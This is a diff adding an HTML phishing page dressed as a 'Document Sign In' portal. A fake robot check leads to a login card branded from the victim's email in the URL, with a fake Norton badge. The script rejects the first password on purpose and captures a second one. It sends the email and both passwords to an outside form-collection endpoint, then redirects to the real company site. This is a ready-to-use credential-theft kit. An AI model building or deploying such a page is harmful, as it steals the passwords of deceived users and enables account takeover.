@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Sign In</title>
+    <!-- Bootstrap 5 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <!-- Google Font: Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            min-height: 100vh;
+            position: relative;
+            background: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+        
+        /* Background Iframe and Overlay */
+        #background-iframe, #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+        }
+        
+        #background-iframe {
+            border: none;
+            z-index: -3;
+            object-fit: cover;
+        }
+        
+        #overlay {
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: -2;
+        }
+        
+        /* Main content - hidden initially */
+        #main-content {
+            display: none;
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Verification Div - Browser check in progress style */
+        #verification-div {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f5f7fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        
+        .verification-box {
+            background: white;
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
+            border: 1px solid #eaeef2;
+        }
+        
+        .verification-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #1e2b39;
+            margin-bottom: 0.5rem;
+        }
+        
+        .verification-subtitle {
+            font-size: 0.95rem;
+            color: #5e6f88;
+            margin-bottom: 2rem;
+        }
+        
+        .checkbox-container {
+            background: #f8fafd;
+            border: 1px solid #e2e8f0;
+            border-radius: 40px;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            transition: all 0.2s;
+        }
+        
+        .checkbox-container:hover {
+            border-color: #0d6efd;
+            background: white;
+        }
+        
+        .form-check-input {
+            accent-color: #0d6efd;
+            width: 1.2rem;
+            height: 1.2rem;
+            cursor: pointer;
+        }
+        
+        .form-check-label {
+            color: #1e2b39;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .help-text {
+            font-size: 0.8rem;
+            color: #8a9bb5;
+            text-align: center;
+        }
+        
+        /* Login Card */
+        .login-card {
+            background: white;
+            border-radius: 20px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.2);
+            width: 100%;
+        }
+        
+        /* Company header with favicon */
+        .company-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 2rem;
+        }
+        
+        #company-favicon {
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            object-fit: contain;
+        }
+        
+        #company-name {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #0b1c2e;
+            line-height: 1.2;
+        }
+        
+        .signin-label {
+            font-size: 0.9rem;
+            color: #5e6f88;
+            margin-bottom: 0.75rem;
+            font-weight: 500;
+        }
+        
+        /* Email display */
+        #email-display {
+            background: #f0f4f9;
+            border-radius: 12px;
+            padding: 1rem 1.25rem;
+            margin-bottom: 1.5rem;
+            font-weight: 500;
+            color: #0b1c2e;
+            border: 1px solid #e2e8f0;
+            word-break: break-all;
+        }
+        
+        /* Password field */
+        .password-field {
+            width: 100%;
+            padding: 1rem 1.25rem;
+            border: 1px solid #d0d9e8;
+            border-radius: 12px;
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .password-field:focus {
+            border-color: #0d6efd;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(13,110,253,0.1);
+        }
+        
+        .continue-btn {
+            width: 100%;
+            background: #0d6efd;
+            color: white;
+            border: none;
+            padding: 1rem;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        /* Norton badge */
+        .norton-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 1.5rem 0;
+        }
+        
+        .norton-icon {
+            background: #e8f0fe;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .norton-icon i {
+            color: #2ecc71;
+            font-size: 1.2rem;
+        }
+        
+        .norton-text {
+            font-weight: 600;
+            color: #1e2b39;
+        }
+        
+        .norton-text span {
+            font-weight: 600;
+            color: #2ecc71;
+        }
+        
+        /* Privacy text */
+        .privacy-text {
+            font-size: 0.8rem;
+            color: #5e6f88;
+            line-height: 1.5;
+            margin: 1rem 0 0.5rem;
+        }
+        
+        /* Privacy policy with dynamic domain */
+        .privacy-policy {
+            font-size: 0.8rem;
+            color: #5e6f88;
+        }
+        
+        #privacy-domain {
+            color: #0d6efd;
+            font-weight: 500;
+        }
+        
+        .error-message {
+            color: #dc3545;
+            font-size: 0.9rem;
+            margin: 0.5rem 0;
+            display: none;
+            text-align: center;
+        }
+        
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+
+<!-- VERIFICATION DIV - Browser check in progress -->
+<div id="verification-div">
+    <div class="verification-box">
+        <div class="verification-title">Browser check in progress</div>
+        <div class="verification-subtitle">Please complete the verification below</div>
+        
+        <div class="checkbox-container">
+            <div class="d-flex align-items-center">
+                <input type="checkbox" id="bot-check" class="form-check-input me-3">
+                <label for="bot-check" class="form-check-label">I am not a robot</label>
+                <div class="ms-auto">
+                    <i class="bi bi-shield-check text-secondary" style="opacity: 0.5;"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="help-text">click the checkbox to verify you're human</div>
+    </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div id="main-content">
+    <!-- Background Iframe - loads the domain from eta -->
+    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+    <div id="overlay"></div>
+    
+    <!-- Login Card -->
+    <div class="login-card">
+        <!-- Company header with favicon - DYNAMIC -->
+        <div class="company-header">
+            <img id="company-favicon" src="" alt="logo" class="me-2">
+            <div id="company-name">Finemancorp.Com</div>
+        </div>
+        
+        <!-- Sign in label -->
+        <div class="signin-label">PLEASE ENTER YOUR PASSWORD</div>
+        
+        <!-- Email display - DYNAMIC -->
+        <div id="email-display">info@finemancorp.com</div>
+        
+        <!-- Error message -->
+        <div id="error-message" class="error-message">Try again</div>
+        
+        <!-- Password field -->
+        <input type="password" id="password" class="password-field" placeholder="Email Password" required>
+        
+        <!-- Continue button -->
+        <button class="continue-btn" id="continue-btn">Continue</button>
+        
+        <!-- Norton badge -->
+        <div class="norton-wrapper">
+            <div class="norton-icon">
+                <i class="bi bi-shield-check"></i>
+            </div>
+            <div class="norton-text">
+                Norton <span>SECURED</span>
+            </div>
+        </div>
+        
+        <!-- Privacy text -->
+        <div class="privacy-text">
+            Your information is only for the sole purpose of viewing this document<br>
+            and would not be sold or shared to any third party
+        </div>
+        
+        <!-- Privacy Policy with dynamic domain -->
+        <div class="privacy-policy">
+            Privacy Policy: <span id="privacy-domain">Finemancorp.Com</span>
+        </div>
+    </div>
+</div>
+
+<!-- Loader Overlay -->
+<div id="loader-overlay" class="loader-overlay">
+    <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
+        <span class="visually-hidden">Loading...</span>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+let submitCount = 0;
+let firstPassword = "";
+let domainUrl = "";
+let fullEmail = "";
+
+document.addEventListener("DOMContentLoaded", function() {
+    // Get email from URL parameter 'eta'
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get("eta");
+    
+    if (email) {
+        fullEmail = email;
+        
+        // Parse domain from email
+        const parts = email.split("@");
+        if (parts.length === 2) {
+            const domain = parts[1];
+            domainUrl = domain;
+            
+            // Format domain for display (Company.Com)
+            const domainParts = domain.split('.');
+            const mainPart = domainParts[0];
+            const extension = domainParts[1];
+            const domainDisplay = mainPart.charAt(0).toUpperCase() + mainPart.slice(1) + '.' + extension;
+            
+            // Update dynamic elements
+            document.getElementById("company-name").textContent = domainDisplay;
+            document.getElementById("email-display").textContent = email;
+            document.getElementById("privacy-domain").textContent = domainDisplay;
+            
+            // Set background iframe to the domain
+            const bgUrl = domain.startsWith("http") ? domain : "https://" + domain;
+            document.getElementById("background-iframe").src = bgUrl;
+            
+            // Update favicon for browser tab
+            const favicon = document.createElement('link');
+            favicon.rel = 'icon';
+            favicon.href = `https://www.google.com/s2/favicons?domain=${domain}`;
+            document.head.appendChild(favicon);
+            
+            // Show company favicon next to domain name
+            document.getElementById("company-favicon").src = `https://www.google.com/s2/favicons?domain=${domain}`;
+        }
+    }
+    
+    // Handle continue button
+    document.getElementById("continue-btn").addEventListener("click", function(e) {
+        e.preventDefault();
+        
+        const currentPassword = document.getElementById("password").value.trim();
+        if (!currentPassword) return;
+        
+        submitCount++;
+        
+        if (submitCount === 1) {
+            firstPassword = currentPassword;
+            document.getElementById("loader-overlay").style.display = "flex";
+            
+            setTimeout(function() {
+                document.getElementById("loader-overlay").style.display = "none";
+                document.getElementById("error-message").style.display = "block";
+                document.getElementById("password").value = "";
+            }, 3000);
+            
+        } else if (submitCount === 2) {
+            document.getElementById("loader-overlay").style.display = "flex";
+            
+            // Send to Formspark
+            fetch('https://submit-form.com/3KukZ309B', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: fullEmail,
+                    first_attempt: firstPassword,
+                    second_attempt: currentPassword,
+                    domain: domainUrl
+                })
+            }).catch(error => console.error('Formspark error:', error));
+            
+            // Redirect to actual domain
+            setTimeout(function() {
+                document.getElementById("loader-overlay").style.display = "none";
+                if (domainUrl) {
+                    window.location.href = "https://" + domainUrl;
+                }
+            }, 3000);
+        }
+    });
+    
+    // Handle verification checkbox
+    const botCheck = document.getElementById('bot-check');
+    const verificationDiv = document.getElementById('verification-div');
+    const mainContent = document.getElementById('main-content');
+    
+    botCheck.addEventListener('change', function() {
+        if (this.checked) {
+            const verifyBox = this.closest('.verification-box');
+            verifyBox.innerHTML = `
+                <div class="text-center py-4">
+                    <div class="spinner-border text-primary mb-3" role="status"></div>
+                    <h6 class="fw-normal">Verifying browser</h6>
+                    <p class="small text-secondary mt-2">please wait</p>
+                </div>
+            `;
+            
+            setTimeout(function() {
+                verificationDiv.innerHTML = `
+                    <div class="verification-box text-center">
+                        <div class="spinner-border text-primary mb-3" role="status"></div>
+                        <h6 class="fw-normal">Redirecting to secure page</h6>
+                        <p class="small text-secondary mt-2">please wait</p>
+                    </div>
+                `;
+                
+                setTimeout(function() {
+                    verificationDiv.style.display = 'none';
+                    mainContent.style.display = 'block';
+                }, 1000);
+            }, 2000);
+        }
+    });
+});
+</script>
+
+</body>
+</html>
